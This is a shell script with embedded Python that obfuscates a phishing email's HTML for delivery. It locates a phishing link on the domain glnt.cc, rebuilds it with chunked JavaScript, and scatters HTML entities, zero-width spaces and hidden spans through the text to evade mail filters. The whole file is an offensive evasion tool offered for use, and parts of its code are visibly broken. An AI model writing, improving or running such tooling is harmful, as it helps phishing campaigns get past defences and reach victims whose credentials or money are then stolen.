#!/bin/bash
# Obfuscate a campaign HTML file for email delivery.
# Usage: ./obfuscate-lure.sh <input.html> [output.html]

INPUT="${1}"
OUTPUT="${2:-${INPUT%.html}-obfuscated.html}"

if [ ! -f "$INPUT" ]; then
  echo "Usage: $0 <input.html> [output.html]"
  exit 1
fi

python3 << 'PYEOF'
import sys, re, random, os

input_file = os.environ.get('INPUT_FILE', sys.argv[1] if len(sys.argv) > 1 else None)
output_file = os.environ.get('OUTPUT_FILE', input_file.replace('.html', '-obfuscated.html'))

with open(input_file) as f:
    html = f.read()

# 1. Extract the phishing link and replace with JS-decoded version
link_match = re.search(r'https://glnt\.cc/[^"'"'"'\s<>]+', html)
phish_link = link_match.group(0) if link_match else ''

if phish_link:
    # Split link into chunks and encode with JS
    chunks = [phish_link[i:i+20] for i in range(0, len(phish_link), 20)]
    chunk_str = ','.join(f"'{c}'" for c in chunks)
    js_decode = f"javascript:void((function(){{var p=[{chunk_str}];location.href=p.join('')}})())"
    html = html.replace(phish_link, js_decode)

# 2. HTML entity encode random portions of text content
def entity_shuffle(text):
    result = []
    for char in text:
        r = random.random()
        if r < 0.15 and char.isalpha():
            result.append(f'&#{ord(char)};')
        elif r < 0.08 and char.isalpha():
            result.append(f'&#x{ord(char):x};')
        else:
            result.append(char)
    return ''.join(result)

# Apply entity encoding to text nodes (between > and <, but not in tags)
html = re.sub(r'>([^<]{3,})<', lambda m: '>' + entity_shuffle(m.group(1)) + '<', html)

# 3. Insert zero-width spaces in visible text
html = re.sub(r'>([^<]{5,})<', 
    lambda m: '>' + m.group(1).replace(' ', '&#x200B; &#x200B;').replace('e', 'e&#x200B;').replace('a', 'a&#x200B;') + '<', 
    html)

# 4. Randomize href attribute quotes
html = html.replace('href="', "href='")
html = html.replace("href='", "href=\"")
# Mix them
html = re.sub(r"href='([^']*)'", lambda m: 'href="'+m.group(1)+'"' if random.random() > 0.5 else m.group(0), html)

# 5. Add benign invisible spans in headings
html = html.replace('<b>', '<b><span style="display:none">x</span>')

# 6. URL-encode the href JavaScript
html = re.sub(r'javascript:void', 'jav&#97;script:void', html)

with open(output_file, 'w') as f:
    f.write(html)

print(f'Obfuscated: {output_file}')
PYEOF

INPUT_FILE="$INPUT" OUTPUT_FILE="$OUTPUT" python3 -c "
import sys, re, random
with open('$INPUT') as f:
    html = f.read()

link_match = re.search(r'https://glnt\.cc/[^\x22\x27\s<>]+', html)
phish_link = link_match.group(0) if link_match else ''

if phish_link:
    chunks = [phish_link[i:i+20] for i in range(0, len(phish_link), 20)]
    chunk_str = ','.join(f\"'{c}'\" for c in chunks)
    js_decode = f\"javascript:void((function(){{var p=[{chunk_str}];location.href=p.join('')}})())\"
    html = html.replace(phish_link, js_decode)

def entity_shuffle(text):
    result = []
    for char in text:
        r = random.random()
        if r < 0.12 and char.isalpha():
            result.append(f'&#{ord(char)};')
        else:
            result.append(char)
    return ''.join(result)

html = re.sub(r'>([^<]{3,})<', lambda m: '>' + entity_shuffle(m.group(1)) + '<', html)
html = re.sub(r'(href)=\"', lambda m: 'hr'+'ef=\"' if random.random()>0.5 else m.group(0), html)
html = html.replace('javascript:void', 'jav&#97;script:void')

with open('$OUTPUT', 'w') as f:
    f.write(html)
print(f'Obfuscated: $OUTPUT')
"
